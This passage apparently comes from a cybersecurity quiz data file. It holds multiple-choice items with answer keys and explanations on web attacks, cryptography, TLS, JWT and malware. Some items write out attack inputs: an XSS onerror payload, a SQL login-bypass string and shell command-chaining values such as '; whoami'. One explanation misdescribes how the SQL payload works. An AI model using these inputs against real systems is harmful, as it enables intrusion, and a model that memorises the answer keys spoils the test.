        question: "What is the purpose of the Cross-Origin Resource Sharing (CORS) mechanism?",
        options: [
            "To prevent SQL injection attacks",
            "To allow or restrict cross-domain web requests from a browser",
            "To encrypt cookies during transmission",
            "To manage user sessions on the server"
        ],
        answer: 1,
        explanation: "CORS is a security feature enforced by browsers that allows a server to indicate which origins (domains) are permitted to access its resources.",
        difficulty: "Easy",
        topic: "CORS"
    },
    {
        id: "cyber_security-76",
        question: "Which HTTP header is used by a server to specify which domains are allowed to read the response via a browser?",
        options: [
            "Access-Control-Allow-Origin",
            "X-Frame-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security"
        ],
        answer: 0,
        explanation: "The Access-Control-Allow-Origin header tells the browser whether to allow the requesting origin to share the response contents.",
        difficulty: "Easy",
        topic: "CORS"
    },
    {
        id: "cyber_security-77",
        question: "What is a Cross-Site Request Forgery (CSRF) attack?",
        options: [
            "Stealing session cookies via JavaScript",
            "Tricking an authenticated user into executing unwanted actions on a web application where they are currently authenticated",
            "Injecting malicious SQL queries into a database",
            "Intercepting network traffic between a client and server"
        ],
        answer: 1,
        explanation: "CSRF exploits the trust a web application has in the user's browser, forcing the browser to send unauthorized commands to the application.",
        difficulty: "Easy",
        topic: "CSRF"
    },
    {
        id: "cyber_security-78",
        question: "Which defense mechanism is most effective against CSRF attacks?",
        options: [
            "Input Validation",
            "Using Anti-CSRF Tokens",
            "Escaping HTML output",
            "Using POST instead of GET requests"
        ],
        answer: 1,
        explanation: "Anti-CSRF tokens are unique, unpredictable values required for state-changing requests, making it impossible for an attacker to forge a valid request without the token.",
        difficulty: "Easy",
        topic: "CSRF"
    },
    {
        id: "cyber_security-79",
        question: "What type of Cross-Site Scripting (XSS) occurs when malicious payload is stored on the target server (e.g., in a database) and served to other users?",
        options: [
            "Reflected XSS",
            "DOM-based XSS",
            "Stored XSS",
            "Self-XSS"
        ],
        answer: 2,
        explanation: "Stored XSS (also called persistent XSS) happens when the malicious script is permanently stored on the server and executed when users view the compromised data.",
        difficulty: "Easy",
        topic: "Stored XSS"
    },
    {
        id: "cyber_security-80",
        question: "Which XSS variant occurs entirely on the client side, typically due to improper handling of user input in JavaScript, without the payload reaching the server?",
        options: [
            "Stored XSS",
            "Reflected XSS",
            "DOM-based XSS",
            "Server XSS"
        ],
        answer: 2,
        explanation: "DOM-based XSS occurs when the vulnerability exists in the client-side JavaScript code that processes data from an untrusted source, manipulating the DOM.",
        difficulty: "Easy",
        topic: "DOM XSS"
    },
    {
        id: "cyber_security-81",
        question: "What is the primary impact of a successful SQL Injection attack?",
        options: [
            "Defacing the website CSS",
            "Executing arbitrary SQL commands on the backend database to read, modify, or delete data",
            "Crashing the user's web browser",
            "Intercepting network packets"
        ],
        answer: 1,
        explanation: "SQL injection exploits vulnerabilities in an application's database queries, allowing an attacker to manipulate the database logic and access or corrupt data.",
        difficulty: "Easy",
        topic: "SQL Injection"
    },
    {
        id: "cyber_security-82",
        question: "Which of the following is a best practice to prevent SQL injection?",
        options: [
            "Using blacklists of malicious keywords",
            "Using Prepared Statements (Parameterized Queries)",
            "Escaping single quotes only",
            "Encrypting the database"
        ],
        answer: 1,
        explanation: "Prepared statements separate the SQL code from the data provided by the user, preventing the database engine from interpreting user input as SQL commands.",
        difficulty: "Easy",
        topic: "SQL Injection"
    },
    {
        id: "cyber_security-83",
        question: "In a blind SQL injection attack, why might an attacker ask the database a true/false question?",
        options: [
            "To download the entire database at once",
            "To infer the contents of the database based on the application's differing responses to true and false statements",
            "To bypass a web application firewall",
            "To execute a reverse shell"
        ],
        answer: 1,
        explanation: "When the application does not return database errors or data directly, attackers use boolean-based blind SQLi to ask true/false questions and deduce data bit by bit.",
        difficulty: "Easy",
        topic: "Blind SQL Injection"
    },
    {
        id: "cyber_security-84",
        question: "What is the risk of using user input directly in an operating system command execution function?",
        options: [
            "SQL Injection",
            "Command Injection",
            "XSS",
            "CSRF"
        ],
        answer: 1,
        explanation: "Command Injection occurs when an attacker injects arbitrary operating system commands into an application that passes user input to a system shell.",
        difficulty: "Easy",
        topic: "Command Injection"
    },
    {
        id: "cyber_security-85",
        question: "Which attack targets LDAP directories by manipulating search filters using user input?",
        options: [
            "SQL Injection",
            "XPath Injection",
            "LDAP Injection",
            "Header Injection"
        ],
        answer: 2,
        explanation: "LDAP Injection exploits applications that construct LDAP queries from user input without proper sanitization, allowing attackers to bypass authentication or extract data.",
        difficulty: "Easy",
        topic: "LDAP Injection"
    },
    {
        id: "cyber_security-86",
        question: "What is a Path Traversal attack?",
        options: [
            "Sending a user to a malicious external website",
            "Using dot-dot-slash sequences (../) to access files outside the intended directory",
            "Injecting code into a running process memory",
            "Overwriting the application's routing table"
        ],
        answer: 1,
        explanation: "Path Traversal (or Directory Traversal) exploits insufficient input validation to access files and directories stored outside the web root folder.",
        difficulty: "Easy",
        topic: "Path Traversal"
    },
    {
        id: "cyber_security-87",
        question: "What does Remote Code Execution (RCE) allow an attacker to do?",
        options: [
            "View the source code of the application",
            "Run arbitrary code of their choice on the target system",
            "Change the administrator password via the UI",
            "Delete log files only"
        ],
        answer: 1,
        explanation: "RCE is one of the most severe vulnerabilities, allowing an attacker to execute any malicious code on the remote machine, often leading to full system compromise.",
        difficulty: "Easy",
        topic: "Remote Code Execution"
    },
    {
        id: "cyber_security-88",
        question: "What is a buffer overflow?",
        options: [
            "When a network switch runs out of MAC addresses",
            "When a program writes data past the boundaries of allocated memory, potentially overwriting adjacent memory",
            "When a database exceeds its storage capacity",
            "When a user exceeds their download quota"
        ],
        answer: 1,
        explanation: "A buffer overflow occurs when more data is written to a memory buffer than it can hold, which can crash the program or allow execution of malicious code.",
        difficulty: "Easy",
        topic: "Buffer Overflow"
    },
    {
        id: "cyber_security-89",
        question: "Which OWASP Top 10 category covers vulnerabilities like CSRF and session fixation?",
        options: [
            "Broken Access Control",
            "Cryptographic Failures",
            "Injection",
            "Security Misconfiguration"
        ],
        answer: 0,
        explanation: "Broken Access Control encompasses failures in enforcing restrictions on what authenticated users are allowed to do, including CSRF and session management issues.",
        difficulty: "Easy",
        topic: "Broken Access Control"
    },
    {
        id: "cyber_security-90",
        question: "Leaving default credentials on a production database server is an example of which OWASP Top 10 vulnerability?",
        options: [
            "Injection",
            "Security Misconfiguration",
            "Vulnerable and Outdated Components",
            "Identification and Authentication Failures"
        ],
        answer: 1,
        explanation: "Security Misconfiguration includes keeping default settings, open cloud storage, incomplete configurations, or default usernames and passwords.",
        difficulty: "Easy",
        topic: "Security Misconfiguration"
    },
    {
        id: "cyber_security-91",
        question: "Which phase of a penetration test involves actively trying to exploit vulnerabilities found in the scanning phase?",
        options: [
            "Reconnaissance",
            "Scanning",
            "Exploitation",
            "Reporting"
        ],
        answer: 2,
        explanation: "The exploitation phase involves using the discovered vulnerabilities to gain access, elevate privileges, or demonstrate the impact of the flaw.",
        difficulty: "Easy",
        topic: "Exploitation"
    },
    {
        id: "cyber_security-92",
        question: "What is the difference between a virus and a worm?",
        options: [
            "A worm requires a host file to replicate, a virus does not",
            "A virus requires a host file to spread, while a worm can replicate and spread independently across networks",
            "Worms only affect Linux systems, viruses only affect Windows",
            "There is no difference; they are synonymous"
        ],
        answer: 1,
        explanation: "Viruses attach themselves to legitimate programs and require user interaction (like executing a file) to spread, whereas worms are standalone and propagate automatically.",
        difficulty: "Easy",
        topic: "Virus"
    },
    {
        id: "cyber_security-93",
        question: "Which type of malware disguises itself as legitimate software to trick users into installing it?",
        options: [
            "Worm",
            "Trojan",
            "Adware",
            "Rootkit"
        ],
        answer: 1,
        explanation: "A Trojan (or Trojan horse) masquerades as useful or benign software but secretly performs malicious actions once executed.",
        difficulty: "Easy",
        topic: "Trojan"
    },
    {
        id: "cyber_security-94",
        question: "What is the primary characteristic of Ransomware?",
        options: [
            "It logs keystrokes",
            "It encrypts a victim's files and demands payment for the decryption key",
            "It displays unwanted advertisements",
            "It creates a backdoor for future access"
        ],
        answer: 1,
        explanation: "Ransomware maliciously encrypts the victim's data, rendering it inaccessible, and extorts the victim for a ransom, usually in cryptocurrency, to restore access.",
        difficulty: "Easy",
        topic: "Ransomware"
    },
    {
        id: "cyber_security-95",
        question: "What is a Rootkit?",
        options: [
            "A tool used to brute-force passwords",
            "A malicious program designed to hide the existence of other malware and maintain privileged access",
            "A type of DDoS attack",
            "A firewall bypass technique"
        ],
        answer: 1,
        explanation: "Rootkits are stealthy malware designed to conceal their presence and the presence of other malicious software from the operating system and security tools.",
        difficulty: "Easy",
        topic: "Rootkit"
    },
    {
        id: "cyber_security-96",
        question: "Which social engineering attack targets high-level executives to steal sensitive information or authorize fraudulent wire transfers?",
        options: [
            "Spear Phishing",
            "Whaling",
            "Vishing",
            "Smishing"
        ],
        answer: 1,
        explanation: "Whaling is a highly targeted phishing attack directed at senior executives or other high-profile individuals within an organization.",
        difficulty: "Easy",
        topic: "Whaling"
    },
    {
        id: "cyber_security-97",
        question: "What is Vishing?",
        options: [
            "Phishing carried out via SMS text messages",
            "Phishing carried out via voice calls",
            "Phishing carried out via social media",
            "Phishing carried out via fake Wi-Fi hotspots"
        ],
        answer: 1,
        explanation: "Vishing (Voice Phishing) uses telephone calls to trick victims into revealing sensitive information, often leveraging Voice over IP (VoIP) technology.",
        difficulty: "Easy",
        topic: "Vishing"
    },
    {
        id: "cyber_security-98",
        question: "In a Man-in-the-Middle (MITM) attack, where does the attacker typically position themselves?",
        options: [
            "On the target's physical desktop",
            "Between the two communicating parties, intercepting and potentially altering traffic",
            "Inside the target's antivirus software",
            "On the web server's database"
        ],
        answer: 1,
        explanation: "In a MITM attack, the attacker secretly intercepts and possibly alters the communication between two parties who believe they are directly communicating with each other.",
        difficulty: "Easy",
        topic: "MITM"
    },
    {
        id: "cyber_security-99",
        question: "What is the goal of a Credential Stuffing attack?",
        options: [
            "To guess passwords using a dictionary",
            "To use stolen username/password pairs from one breach to log into accounts on other websites",
            "To trick a user into entering credentials on a fake login page",
            "To crack password hashes using rainbow tables"
        ],
        answer: 1,
        explanation: "Credential stuffing exploits the common practice of password reuse by automating login attempts with credentials leaked from other data breaches.",
        difficulty: "Easy",
        topic: "Credential Stuffing"
    },
    {
        id: "cyber_security-100",
        question: "Which type of DDoS attack sends a massive wave of TCP SYN requests without completing the three-way handshake?",
        options: [
            "UDP Flood",
            "ICMP Flood",
            "SYN Flood",
            "HTTP Flood"
        ],
        answer: 2,
        explanation: "A SYN flood exploits the TCP handshake process by sending many SYN requests and ignoring the server's SYN-ACK responses, exhausting the server's connection queue.",
        difficulty: "Easy",
        topic: "SYN Flood"
    },
    {
        id: "cyber_security-101",
        question: "A system uses a 256-bit key for AES-GCM. If an attacker steals the ciphertext but not the key, what cryptographic property ensures the data remains unreadable?",
        options: [
            "Integrity",
            "Authentication",
            "Confidentiality",
            "Non-repudiation"
        ],
        answer: 2,
        explanation: "Confidentiality is provided by the encryption algorithm and the secret key. Without the key, the ciphertext provides no information about the plaintext.",
        difficulty: "Medium",
        topic: "Confidentiality"
    },
    {
        id: "cyber_security-102",
        question: "An e-commerce site guarantees that an order placed by a customer cannot be denied by the customer later. Which security principle does this represent?",
        options: [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Non-repudiation"
        ],
        answer: 3,
        explanation: "Non-repudiation provides proof of the origin and delivery of data, ensuring a party cannot successfully deny having performed an action like placing an order.",
        difficulty: "Medium",
        topic: "CIA Triad"
    },
    {
        id: "cyber_security-103",
        question: "In an ABAC system, a policy states: 'Allow access if User.Role == 'Manager' AND Resource.Department == User.Department AND Time.Hour < 18'. What happens if a Manager tries to access a resource in a different department at 16:00?",
        options: [
            "Access is granted because the user is a Manager",
            "Access is granted because the time is correct",
            "Access is denied because the department attribute does not match",
            "Access is granted because two out of three conditions are met"
        ],
        answer: 2,
        explanation: "ABAC evaluates all conditions logically (AND). Since the user's department does not match the resource's department, the entire policy evaluates to false, denying access.",
        difficulty: "Medium",
        topic: "ABAC"
    },
    {
        id: "cyber_security-104",
        question: "A company implements a workflow where one employee submits a purchase order and a different employee must approve it. Which security principle is being enforced?",
        options: [
            "Least Privilege",
            "Separation of Duties",
            "Job Rotation",
            "Mandatory Vacations"
        ],
        answer: 1,
        explanation: "Separation of Duties divides critical tasks among multiple individuals to prevent fraud and errors, ensuring no single person has complete control over a transaction.",
        difficulty: "Medium",
        topic: "Access Control"
    },
    {
        id: "cyber_security-105",
        question: "In a Zero Trust Architecture, what is the primary mechanism used to verify access requests?",
        options: [
            "Trusting traffic from the internal LAN",
            "Continuous verification of identity, device health, and context",
            "Using a single strong perimeter firewall",
            "Relying on antivirus on endpoints"
        ],
        answer: 1,
        explanation: "Zero Trust relies on continuous, dynamic evaluation of trust based on identity, device, location, and data context, rather than implicit network trust.",
        difficulty: "Medium",
        topic: "Zero Trust"
    },
    {
        id: "cyber_security-106",
        question: "An application uses AES-256-CBC for encryption but fails to implement an HMAC. What attack is this application vulnerable to?",
        options: [
            "Key Exhaustion",
            "Padding Oracle Attack",
            "Rainbow Table Attack",
            "Birthday Attack"
        ],
        answer: 1,
        explanation: "Without an HMAC to verify integrity and authenticity, CBC mode is susceptible to Padding Oracle attacks, where an attacker can decrypt the ciphertext by observing error messages related to padding.",
        difficulty: "Medium",
        topic: "Encryption"
    },
    {
        id: "cyber_security-107",
        question: "Which symmetric encryption mode combines the speed of a stream cipher with the authentication of a MAC in a single operation?",
        options: [
            "ECB",
            "CBC",
            "GCM (Galois/Counter Mode)",
            "CFB"
        ],
        answer: 2,
        explanation: "GCM is an authenticated encryption mode that provides both data confidentiality (encryption) and integrity/authentication (via a Galois field MAC) efficiently.",
        difficulty: "Medium",
        topic: "AES"
    },
    {
        id: "cyber_security-108",
        question: "Why is ECB mode generally discouraged for encrypting images or large structured data?",
        options: [
            "It is too slow",
            "It requires a very large key size",
            "Identical plaintext blocks produce identical ciphertext blocks, revealing patterns",
            "It only works on text data"
        ],
        answer: 2,
        explanation: "Because ECB encrypts blocks independently, patterns in the plaintext (like the repeating pixels in an image) are preserved in the ciphertext, leaking information.",
        difficulty: "Medium",
        topic: "AES"
    },
    {
        id: "cyber_security-109",
        question: "During an RSA key exchange, if an attacker can factor the modulus 'n' into its prime factors 'p' and 'q', what is the immediate consequence?",
        options: [
            "The attacker can decrypt all past and future messages",
            "The attacker can derive the private key from the public key",
            "The attacker can change the public key",
            "The hash of the message is broken"
        ],
        answer: 1,
        explanation: "The security of RSA relies on the difficulty of factoring 'n'. If 'p' and 'q' are known, the private key 'd' can be easily calculated from the public key 'e'.",
        difficulty: "Medium",
        topic: "RSA"
    },
    {
        id: "cyber_security-110",
        question: "What vulnerability arises if a system uses the same nonce (number used once) for multiple encryptions using the same key in AES-CTR mode?",
        options: [
            "The key can be recovered",
            "The nonce acts as an IV, and reusing it allows an attacker to perform a known-plaintext attack to recover the keystream",
            "The ciphertext will be truncated",
            "The algorithm switches to ECB mode"
        ],
        answer: 1,
        explanation: "In CTR mode, the nonce and key generate a keystream. If the nonce is reused, the same keystream is generated, allowing an attacker to XOR two ciphertexts together to cancel out the key and analyze the plaintexts.",
        difficulty: "Medium",
        topic: "AES"
    },
    {
        id: "cyber_security-111",
        question: "What is Perfect Forward Secrecy (PFS) in the context of TLS?",
        options: [
            "The server's private key is backed up securely",
            "Compromising the server's long-term private key does not compromise past session keys",
            "The client verifies the server's certificate perfectly",
            "The handshake is completed in zero round trips"
        ],
        answer: 1,
        explanation: "PFS ensures that if the server's private key is compromised in the future, an attacker cannot decrypt previously captured TLS sessions because those sessions used ephemeral session keys.",
        difficulty: "Medium",
        topic: "TLS Handshake"
    },
    {
        id: "cyber_security-112",
        question: "Which key exchange algorithm provides Perfect Forward Secrecy in modern TLS configurations?",
        options: [
            "Static RSA",
            "Diffie-Hellman Ephemeral (DHE)",
            "AES-256",
            "SHA-512"
        ],
        answer: 1,
        explanation: "DHE (and ECDHE) uses ephemeral keys that are generated for each session and discarded afterward, ensuring PFS.",
        difficulty: "Medium",
        topic: "Diffie-Hellman"
    },
    {
        id: "cyber_security-113",
        question: "A Certificate Authority (CA) is compromised, and an attacker issues a fraudulent certificate for a popular domain. What mechanism helps clients detect this unauthorized certificate?",
        options: [
            "CRL",
            "Certificate Transparency (CT) logs",
            "OCSP",
            "DNSSEC"
        ],
        answer: 1,
        explanation: "Certificate Transparency requires CAs to publicly log all issued certificates. Browsers and domain owners can monitor these logs to detect unauthorized or mis-issued certificates.",
        difficulty: "Medium",
        topic: "Certificates"
    },
    {
        id: "cyber_security-114",
        question: "Why should a Certificate Signing Request (CSR) be generated on the end-server itself rather than on an external machine?",
        options: [
            "To reduce CPU load on the CA",
            "To ensure the private key is generated locally and never transmitted",
            "Because CSRs are incompatible with cloud environments",
            "To automatically configure the web server"
        ],
        answer: 1,
        explanation: "Generating the CSR on the server ensures that the private key is created in the server's local environment and never crosses the network, maintaining its confidentiality.",
        difficulty: "Medium",
        topic: "PKI"
    },
    {
        id: "cyber_security-115",
        question: "An attacker computes the hashes of every possible 8-character password combination and stores them in a database. What is this database called?",
        options: [
            "Dictionary",
            "Rainbow Table",
            "Wordlist",
            "Credential Dump"
        ],
        answer: 1,
        explanation: "A rainbow table is a precomputed table used to reverse cryptographic hash functions, trading storage space for computation time to crack passwords.",
        difficulty: "Medium",
        topic: "Hashing"
    },
    {
        id: "cyber_security-116",
        question: "If a password hash uses a fast algorithm like SHA-256 without a salt and an attacker obtains the hash, what is the most efficient attack vector?",
        options: [
            "Dictionary attack only",
            "Brute force using a GPU cluster",
            "Social engineering",
            "SQL injection"
        ],
        answer: 1,
        explanation: "Because SHA-256 is designed to be fast and lacks a salt, an attacker can easily use the massive parallel processing power of modern GPUs to brute-force the hash rapidly.",
        difficulty: "Medium",
        topic: "Password Hashing"
    },
    {
        id: "cyber_security-117",
        question: "What is the 'pepper' in the context of password hashing?",
        options: [
            "A random value stored in the database alongside the hash",
            "A secret cryptographic key added to the password before hashing, stored separately from the database",
            "An algorithm used to speed up hashing",
            "A type of brute force attack"
        ],
        answer: 1,
        explanation: "A pepper is a secret key added to the password prior to hashing. Unlike the salt, the pepper is not stored in the database, providing an additional layer of security if the database is leaked.",
        difficulty: "Medium",
        topic: "Password Hashing"
    },
    {
        id: "cyber_security-118",
        question: "Which of the following password hashing algorithms is considered outdated and insecure due to design flaws and fast execution speed?",
        options: [
            "bcrypt",
            "scrypt",
            "PBKDF2",
            "LANMAN"
        ],
        answer: 3,
        explanation: "LANMAN hash (used in early Windows) splits the password into two 7-character halves, converts to uppercase, and uses DES without salting, making it trivially easy to crack.",
        difficulty: "Medium",
        topic: "Password Hashing"
    },
    {
        id: "cyber_security-119",
        question: "When verifying an HMAC, what must the receiver possess to successfully validate the message?",
        options: [
            "The sender's public key",
            "The shared secret key",
            "The receiver's private key",
            "The CA's root certificate"
        ],
        answer: 1,
        explanation: "HMAC uses a shared secret key. Both the sender (to generate the HMAC) and the receiver (to verify it) must know this secret key.",
        difficulty: "Medium",
        topic: "HMAC"
    },
    {
        id: "cyber_security-120",
        question: "During a TLS 1.2 handshake using an ECDHE cipher suite, when is the master secret generated?",
        options: [
            "Before the ClientHello is sent",
            "After the client and server exchange their Diffie-Hellman parameters and compute the pre-master secret",
            "After the server sends the Certificate",
            "During the application data phase"
        ],
        answer: 1,
        explanation: "The master secret is derived from the pre-master secret, which is computed independently by both parties using the exchanged Diffie-Hellman parameters.",
        difficulty: "Medium",
        topic: "TLS Handshake"
    },
    {
        id: "cyber_security-121",
        question: "What is the purpose of the 'ChangeCipherSpec' message in TLS 1.2?",
        options: [
            "To tell the server to switch to a different cipher suite",
            "To signal that subsequent records will be protected under the newly negotiated keys and algorithms",
            "To terminate the handshake",
            "To request the client's certificate"
        ],
        answer: 1,
        explanation: "ChangeCipherSpec is a signal passed between the client and server to indicate that they will now start using the negotiated symmetric keys to encrypt traffic.",
        difficulty: "Medium",
        topic: "TLS Handshake"
    },
    {
        id: "cyber_security-122",
        question: "In IPsec, which protocol provides data origin authentication, data integrity, and anti-replay services, but not confidentiality?",
        options: [
            "ESP (Encapsulating Security Payload)",
            "AH (Authentication Header)",
            "IKE (Internet Key Exchange)",
            "ISAKMP"
        ],
        answer: 1,
        explanation: "AH provides authentication and integrity for the entire IP packet (including the header in transport mode) but does not encrypt the payload. ESP is used for encryption.",
        difficulty: "Medium",
        topic: "IPSec"
    },
    {
        id: "cyber_security-123",
        question: "A network administrator wants to allow only specific internal IP addresses to access the internet, but allow all internal IPs to communicate with each other. Which firewall technology is best suited for this?",
        options: [
            "Stateless ACL",
            "Stateful Inspection with Zone-Based policies",
            "Proxy Firewall",
            "WAF"
        ],
        answer: 1,
        explanation: "Stateful inspection with zones allows the admin to define different trust levels (e.g., internal zone vs. external zone) and create policies dictating what traffic can cross between them.",
        difficulty: "Medium",
        topic: "Stateful Firewall"
    },
    {
        id: "cyber_security-124",
        question: "A WAF blocks a request containing the string 'SELECT * FROM users'. The attacker modifies the request to 'SeLeCt * FrOm users'. The WAF allows it, and the database executes it. What WAF weakness does this demonstrate?",
        options: [
            "Positive Security Model failure",
            "Case Evasion",
            "Encryption Bypass",
            "Protocol Downgrade"
        ],
        answer: 1,
        explanation: "This demonstrates a case evasion flaw. The WAF used a case-sensitive blacklist signature, while the backend SQL engine interpreted the keywords case-insensitively.",
        difficulty: "Medium",
        topic: "WAF"
    },
    {
        id: "cyber_security-125",
        question: "An IDS generates thousands of alerts for benign traffic from a known internal scanner. What is the best immediate action to improve the SOC's efficiency?",
        options: [
            "Turn off the IDS",
            "Create an exception rule to filter out the known scanner's IP and tune the IDS",
            "Reboot the IDS appliance",
            "Block the internal scanner's IP at the border firewall"
        ],
        answer: 1,
        explanation: "Alert fatigue is a major SOC issue. Tuning the IDS by creating exceptions for known, authorized benign activity reduces noise and allows analysts to focus on real threats.",
        difficulty: "Medium",
        topic: "IDS"
    },
    {
        id: "cyber_security-126",
        question: "Which SIEM correlation rule logic is most appropriate to detect a potential brute force attack?",
        options: [
            "Single event: User logs in successfully",
            "Threshold: More than 5 failed login attempts for the same user within 1 minute",
            "Sequence: User visits login page, then logs out",
            "Whitelist: User IP is not in the approved list"
        ],
        answer: 1,
        explanation: "A threshold rule detects a specific volume of events (failed logins) within a defined time window, which is the classic indicator of a brute force attack.",
        difficulty: "Medium",
        topic: "SIEM"
    },
    {
        id: "cyber_security-127",
        question: "An EDR tool flags a legitimate application (e.g., PowerShell) because it is performing unusual behavior. What type of detection mechanism triggered this alert?",
        options: [
            "Signature-based",
            "Behavioral or Heuristic-based",
            "Sandboxing",
            "File Hash matching"
        ],
        answer: 1,
        explanation: "Behavioral detection monitors the actions of processes in real-time. Since PowerShell is a legitimate Microsoft binary, a signature wouldn't flag it, but its unusual behavior would trigger a heuristic alert.",
        difficulty: "Medium",
        topic: "EDR"
    },
    {
        id: "cyber_security-128",
        question: "What is a 'living off the land' (LotL) attack in the context of endpoint security?",
        options: [
            "An attack that only targets agricultural systems",
            "Using legitimate system tools (like PowerShell, WMI, or PsExec) to perform malicious activities",
            "An attack that survives system reboots by hiding in the BIOS",
            "Downloading custom malware from the internet"
        ],
        answer: 1,
        explanation: "LotL attacks leverage pre-installed, trusted system tools to evade detection, as blocking these tools would break normal system administration.",
        difficulty: "Medium",
        topic: "Endpoint Security"
    },
    {
        id: "cyber_security-129",
        question: "A user's OAuth token is stolen via an XSS attack. The attacker uses the token to access the user's data. What is the primary mitigation to limit the damage of such token theft?",
        options: [
            "Use longer tokens",
            "Implement short-lived access tokens and require refresh tokens with rotation",
            "Base64 encode the token",
            "Store the token in LocalStorage instead of a cookie"
        ],
        answer: 1,
        explanation: "By making access tokens short-lived, the window for an attacker to use a stolen token is minimized. Refresh token rotation also ensures that if a refresh token is stolen, it can only be used once.",
        difficulty: "Medium",
        topic: "OAuth"
    },
    {
        id: "cyber_security-130",
        question: "In OpenID Connect, what is the purpose of the 'id_token'?",
        options: [
            "To authorize access to an API",
            "To represent the user's identity and authentication status as a JWT",
            "To encrypt the session cookie",
            "To replace the user's password"
        ],
        answer: 1,
        explanation: "The OIDC id_token is a JWT that contains claims about the user's authentication event, such as when they logged in and who authenticated them.",
        difficulty: "Medium",
        topic: "OpenID Connect"
    },
    {
        id: "cyber_security-131",
        question: "A developer sets the `alg` header of a JWT to 'none' and removes the signature. The server accepts it. What vulnerability is present?",
        options: [
            "Algorithm Substitution Attack",
            "JWT None Algorithm Attack",
            "Cross-Site Scripting",
            "Token Overflow"
        ],
        answer: 1,
        explanation: "If a server is misconfigured to accept the 'none' algorithm, an attacker can forge a valid JWT by simply removing the signature and setting the algorithm to 'none', bypassing authentication.",
        difficulty: "Medium",
        topic: "JWT"
    },
    {
        id: "cyber_security-132",
        question: "What happens if the `sub` (subject) claim in a JWT is modified by an attacker but the signature is not updated?",
        options: [
            "The server will grant access to the new subject",
            "The signature verification will fail, and the server will reject the token",
            "The token will automatically expire",
            "The server will prompt the user for a new password"
        ],
        answer: 1,
        explanation: "The signature is calculated over the header and payload. Changing any part of the payload invalidates the signature, causing verification to fail.",
        difficulty: "Medium",
        topic: "JWT"
    },
    {
        id: "cyber_security-133",
        question: "An application allows a user to log in, then redirects them to a URL containing the session ID in the query parameter: `https://site.com/dashboard?sessid=123`. What is the primary security risk?",
        options: [
            "SQL Injection",
            "Session Hijacking via URL sniffing or Referer header leakage",
            "CSRF",
            "XSS"
        ],
        answer: 1,
        explanation: "Passing session IDs in URLs is insecure because the URL can be logged in browser history, proxy logs, or leaked via the HTTP Referer header to external sites.",
        difficulty: "Medium",
        topic: "Session Management"
    },
    {
        id: "cyber_security-134",
        question: "A web server sets the `SameSite=Strict` attribute on a session cookie. How does this affect cross-site requests?",
        options: [
            "The cookie is never sent",
            "The cookie is only sent if the request originates from the same site that set the cookie",
            "The cookie is sent on all cross-site POST requests",
            "The cookie is encrypted"
        ],
        answer: 1,
        explanation: "`SameSite=Strict` prevents the browser from sending the cookie in any cross-site requests, effectively mitigating CSRF attacks, though it may impact user experience with external links.",
        difficulty: "Medium",
        topic: "Cookies"
    },
    {
        id: "cyber_security-135",
        question: "An API returns `Access-Control-Allow-Origin: *` along with `Access-Control-Allow-Credentials: true`. Why is this a security misconfiguration?",
        options: [
            "It causes a CORS error in the browser",
            "Browsers will block the response because wildcard origins cannot be used with credentials",
            "It allows any site to make credentialed requests on behalf of the user",
            "It exposes the API to SQL injection"
        ],
        answer: 1,
        explanation: "The CORS specification strictly forbids setting `Access-Control-Allow-Credentials: true` when the origin is a wildcard (`*`). Browsers will reject this configuration.",
        difficulty: "Medium",
        topic: "CORS"
    },
    {
        id: "cyber_security-136",
        question: "A developer implements a CSRF defense by checking the `Referer` header. What is a common limitation of this approach?",
        options: [
            "The Referer header is always empty",
            "Some browsers or browser extensions strip the Referer header for privacy reasons",
            "It only works for POST requests",
            "It is vulnerable to SQL injection"
        ],
        answer: 1,
        explanation: "Relying on the Referer header is unreliable because privacy-focused browsers or extensions might omit it, causing legitimate requests to be blocked.",
        difficulty: "Medium",
        topic: "CSRF"
    },
    {
        id: "cyber_security-137",
        question: "An attacker finds a reflected XSS vulnerability but realizes the application filters `<script>` tags. They use `<img src=x onerror=alert(1)>` instead. What bypass technique did they use?",
        options: [
            "SQL Injection",
            "Event Handler Injection",
            "DOM Clobbering",
            "Unicode Encoding"
        ],
        answer: 1,
        explanation: "Instead of using a direct script tag, the attacker injects an HTML tag with an event handler (like `onerror`) that executes JavaScript when the image fails to load.",
        difficulty: "Medium",
        topic: "Reflected XSS"
    },
    {
        id: "cyber_security-138",
        question: "Which Content Security Policy (CSP) directive is most effective at mitigating XSS attacks by restricting where scripts can be loaded from?",
        options: [
            "default-src 'self'",
            "script-src 'self' https://trusted.cdn.com",
            "img-src 'self'",
            "object-src 'none'"
        ],
        answer: 1,
        explanation: "The `script-src` directive specifically controls which sources (e.g., 'self' or specific domains) are allowed to execute JavaScript, directly preventing unauthorized inline or external scripts.",
        difficulty: "Medium",
        topic: "XSS"
    },
    {
        id: "cyber_security-139",
        question: "An application uses `innerHTML` in JavaScript to render user comments. If a user submits a malicious comment, what type of vulnerability is likely introduced?",
        options: [
            "SQL Injection",
            "DOM-based XSS",
            "CSRF",
            "CORS Misconfiguration"
        ],
        answer: 1,
        explanation: "Using `innerHTML` causes the browser to parse the input as HTML. If the input contains JavaScript, it will be executed directly in the DOM, leading to DOM-based XSS.",
        difficulty: "Medium",
        topic: "DOM XSS"
    },
    {
        id: "cyber_security-140",
        question: "In a time-based blind SQL injection, how does the attacker extract data?",
        options: [
            "By observing differences in the HTML content of the page",
            "By observing database error messages",
            "By sending queries that cause the database to pause (sleep) if a condition is true, measuring the response time",
            "By downloading the database file directly"
        ],
        answer: 2,
        explanation: "When no visual or error feedback is available, attackers inject commands like `SLEEP(10)`. If the response takes 10 seconds, the condition was true, allowing bit-by-bit data extraction.",
        difficulty: "Medium",
        topic: "Blind SQL Injection"
    },
    {
        id: "cyber_security-141",
        question: "A pentester enters `' OR '1'='1` into a login form and gains access. What is the likely underlying SQL query?",
        options: [
            "SELECT * FROM users WHERE username='$input' AND password='$pass'",
            "SELECT * FROM users WHERE username='$input'",
            "INSERT INTO users VALUES ('$input')",
            "DELETE FROM users WHERE username='$input'"
        ],
        answer: 0,
        explanation: "The injection `' OR '1'='1` closes the username string, adds an OR clause that is always true, and comments out the password check, bypassing authentication.",
        difficulty: "Medium",
        topic: "SQL Injection"
    },
    {
        id: "cyber_security-142",
        question: "Which command injection payload would allow an attacker to execute a second command after the intended one in a Linux environment?",
        options: [
            "` && whoami `",
            "` ; whoami `",
            "` | whoami `",
            "All of the above"
        ],
        answer: 3,
        explanation: "In Linux shells, `;` (sequential execution), `&&` (execute second if first succeeds), and `|` (pipe output) can all be used to chain commands and achieve code execution.",
        difficulty: "Medium",
